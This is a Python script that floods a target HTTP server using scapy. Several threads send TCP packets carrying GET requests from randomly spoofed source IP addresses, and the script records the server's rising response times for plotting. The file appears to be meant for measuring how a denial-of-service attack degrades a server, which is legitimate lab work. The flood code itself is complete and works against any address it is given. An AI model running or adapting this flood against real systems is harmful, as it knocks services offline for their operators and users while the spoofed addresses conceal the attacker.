import random
from matplotlib.ticker import MultipleLocator
from scapy.all import *
from scapy.layers.inet import *
import time
import http.client
import threading
import matplotlib.pyplot as plt

global threads_run


def dos(server_ip, server_port):

    # Craft an HTTP GET request packet
    tcp_packet = TCP(dport=server_port, sport=12345)
    get_request = (
        "GET / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "\r\n"
    ).format(server_ip)

    global threads_run
    while threads_run:
        rand_num1 = random.randint(1, 254)
        rand_num2 = random.randint(1, 254)
        rand_num3 = random.randint(1, 254)
        rand_num4 = random.randint(1, 254)
        src_ip = f'{str(rand_num1)}.{str(rand_num2)}.{str(rand_num3)}.{str(rand_num4)}'
        ip_packet = IP(src=src_ip, dst=server_ip)

        _packet = ip_packet / tcp_packet / get_request

        # Send the packet
        send(_packet, verbose=0)


def get_response_time(server_ip, server_port, path="/"):
    try:
        start_time = time.time()

        # Create an HTTP connection
        conn = http.client.HTTPConnection(server_ip, server_port)

        # Send a GET request
        conn.request("GET", path)

        # Get the response
        response = conn.getresponse()  # used to measure response time of server

        # Measure the response time
        response_time = (time.time() - start_time) * 1000  # in milliseconds

        # Close the connection
        conn.close()

        return response_time

    except Exception as e:
        # print(f"An error occurred: {e}")
        return None


def response_time_iterate(server_ip, port, q):
    _iter = 0
    avg_iter = 0
    res_sum = 0
    res_avg = 0
    while _iter < 100:
        response_time = get_response_time(server_ip, port)
        if response_time is None:
            pass
        else:
            if avg_iter<10:
                res_sum += response_time
                avg_iter += 1
            else:
                res_avg = res_sum/avg_iter
                q.put(res_avg)
                _iter += 1
                avg_iter = 0
                res_sum = 0
            time.sleep(0.1)


def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_threads=10, samples_for_avg=10, output = None):
    global threads_run
    threads_run = True

    # server_port must be int
    server_port = int(server_port)

    # sample iterations
    _iter = 1

    # total number of samples averages
    num_of_samples = (1+num_of_threads) * response_avgs_between_threads

    # iterations to calculate avg of responses
    avg_iter = 0

    # sum of responses to calculate average
    res_sum = 0

    # response time average
    res_avg = 0

    # list of dos threads
    dos_threads = []

    # list of iterations for the graph
    iter_list = []

    # list of response times for the graph
    response_times_list = []

    # initialize dos threads
    for i in range(num_of_threads):
        dos_threads.append(threading.Thread(target=dos, args=(server_ip, server_port), daemon=True))

    while _iter < (num_of_samples + 1):
        try:
            # calculate response times averages
            while avg_iter < samples_for_avg:
                response_time = get_response_time(server_ip, server_port)
                if response_time is None:
                    # print("error")
                    pass
                else:
                    res_sum += response_time
                    avg_iter += 1
                    time.sleep(1/samples_for_avg)
            res_avg = res_sum / avg_iter
            # reset average variables after calculating the average
            avg_iter = 0
            res_sum = 0
            # append the iteration to the list
            iter_list.append(_iter - 1)
            # append the response time average to the list
            response_times_list.append(res_avg)

            # starting dos thread at the required time
            if num_of_samples > _iter >= response_avgs_between_threads and _iter % response_avgs_between_threads == 0:
                thread_num = _iter // response_avgs_between_threads
                dos_threads[thread_num - 1].start()
                if output:
                    output.emit(f"DoS thread number {thread_num} is running")
            _iter += 1

        except KeyboardInterrupt:
            break

    # stop all threads
    threads_run = False

    return iter_list, response_times_list, num_of_threads, num_of_samples, response_avgs_between_threads